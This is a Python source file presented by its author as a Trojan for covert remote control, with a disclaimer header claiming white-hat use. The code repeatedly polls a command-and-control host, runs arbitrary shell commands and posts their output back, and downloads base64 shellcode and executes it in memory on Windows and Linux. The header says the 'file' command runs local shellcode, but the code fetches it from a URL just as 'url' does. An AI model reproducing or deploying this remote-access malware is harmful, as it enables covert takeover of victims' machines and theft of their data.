#! /usr/bin/python
#!/usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 7th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script serves as a clandestine tool for remote command execution, designed for covert operations.
# It operates as a Trojan, silently awaiting commands from a centralized control and command server (C&C).
# Once deployed, the Trojan continuously polls the C&C server for instructions. It can execute 
# various types of commands, including shell commands ('cmd'), running shellcode from a local file 
# ('file'), or fetching and executing shellcode from a specified URL ('url'). Results of the 
# executed commands are securely transmitted back to the C&C server. To use it, simply deploy the
# script on the target system, ensuring that the C&C server URL is correctly configured. Through
# the C&C interface, operatives can remotely control and manipulate the target system with discretion,
# making it a powerful tool for clandestine operations.
#################################################################################################
import subprocess
import base64
import ctypes
import requests
import sys

# Function to retrieve shellcode from a URL
def get_code_from_url(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return base64.b64decode(response.content)  # Decode base64 encoded content
        else:
            return None
    except Exception as e:
        return None

# Function to execute a command in the shell
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode(sys.getdefaultencoding(), 'ignore')  # Decode bytes to string
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e.output.decode(sys.getdefaultencoding(), 'ignore')}"

# Function to execute shellcode
def run_shellcode(shellcode):
    if sys.platform.startswith('win'):
        kernel32 = ctypes.windll.kernel32
        ptr = kernel32.VirtualAlloc(kernel32.NULL, len(shellcode), 0x3000, 0x40)  # Allocate memory
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), shellcode, len(shellcode))
        ctypes.windll.kernel32.CreateThread(kernel32.NULL, 0, ptr, kernel32.NULL, 0, 0)
        ctypes.windll.kernel32.WaitForSingleObject(kernel32.NULL, 0xFFFFFFFF)
    elif sys.platform.startswith('linux'):
        libc = ctypes.CDLL(None)
        sc = ctypes.create_string_buffer(shellcode)
        size = len(shellcode)
        addr = libc.valloc(size)  # Allocate memory
        ctypes.memmove(addr, sc, size)  # Move shellcode to memory
        libc.mprotect(addr, size, 0x7)  # Set memory protection to allow execution
        func = ctypes.CFUNCTYPE(ctypes.c_void_p)
        runtime = ctypes.cast(addr, func)
        runtime()

# Function to continuously receive commands and execute them
def main():
    while True:
        try:
            response = requests.get("http://C&C_SERVER/command")
            command = response.text.strip().lower()
            if command == 'cmd':
                output = execute_command(requests.get("http://C&C_SERVER/command-data").text.strip())
                requests.post("http://C&C_SERVER/result", data=output)
            elif command == 'file':
                url = requests.get("http://C&C_SERVER/command-data").text.strip()
                shellcode = get_code_from_url(url)
                if shellcode:
                    run_shellcode(shellcode)
            elif command == 'url':
                url = requests.get("http://C&C_SERVER/command-data").text.strip()
                shellcode = get_code_from_url(url)
                if shellcode:
                    run_shellcode(shellcode)
            else:
                requests.post("http://C&C_SERVER/result", data="Invalid command")
        except Exception as e:
            requests.post("http://C&C_SERVER/result", data=f"Error occurred: {e}")

if __name__ == '__main__':
    main()
